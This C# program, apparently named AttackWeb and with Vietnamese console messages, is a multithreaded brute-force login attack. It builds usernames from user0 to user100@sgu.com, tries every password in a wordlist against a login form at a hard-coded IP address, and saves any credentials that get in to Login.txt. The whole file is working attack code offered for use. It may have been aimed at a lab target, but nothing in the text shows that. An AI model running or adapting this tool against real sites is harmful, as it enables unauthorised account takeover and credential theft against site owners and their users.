using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Threading;
using xNet;
namespace AttackWeb
{
    class Program
    {
        public static List<string> success = new List<string>();
        public static string[] array;

        public static bool isRunning = true;
        static void Main(string[] args)
        {
            if (!File.Exists("list.txt"))
            {
                Console.WriteLine("Không tìm thấy file");
                return;
            }
            array = File.ReadAllLines("list.txt");
            Thread myNewThread = new Thread(() => AttackFunc("1", 0, 20));
            Thread myNewThread2 = new Thread(() => AttackFunc("2", 20, 40));
            Thread myNewThread3 = new Thread(() => AttackFunc("3", 40, 60));
            Thread myNewThread4 = new Thread(() => AttackFunc("4", 60, 80));
            Thread myNewThread5 = new Thread(() => AttackFunc("5", 80, 101));
            myNewThread.Start();
            myNewThread2.Start();
            myNewThread3.Start();
            myNewThread4.Start();
            myNewThread5.Start();

        }
        public static void AttackFunc(string name, int start, int end)
        {
            while (isRunning)
            {
                try
                {

                    for (int i = start; i < end; i++)
                    {
                        string username = "user" + i + "@sgu.com";
                        Console.WriteLine(username);
                        for (int j = 0; j < Program.array.Length; j++)
                        {
                            /* string[] array2 = Program.array[i].ToString().Split(new char[]
                                {
                                     ':'
                                });*/
                            string password = Program.array[j];
                            HttpRequest http = new HttpRequest();
                            http.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Edg/99.0.1150.36";
                            string data = "email_signin=" + WebUtility.UrlEncode(username) + "&password_signin=" + WebUtility.UrlEncode(password) + "&login=";
                            Console.WriteLine("Thread " +name +"[" + j + "]" + data);
                            string html = http.Post("http://139.59.254.61/index.php", data, "application/x-www-form-urlencoded").ToString();
                            if (html.Contains("User Profile"))
                            {

                                Console.WriteLine("Login thành công " + username + " :" + password);
                                string succes = username + ":" + password;
                                success.Add(succes);
                                TextWriter text = new StreamWriter("Login.txt");
                                for (int n = 0; n < success.Count; n++)
                                {
                                    text.Write(success[n]);
                                    text.WriteLine("");

                                }
                                text.Close();
                                break;
                            }
                        }
                    }
                    Console.WriteLine("Thread " + name + "  xong ");
                    break;
                }
                catch (Exception e)
                {
                    Console.WriteLine("Lỗi " + e.ToString());
                }
            }
        }
    }
}
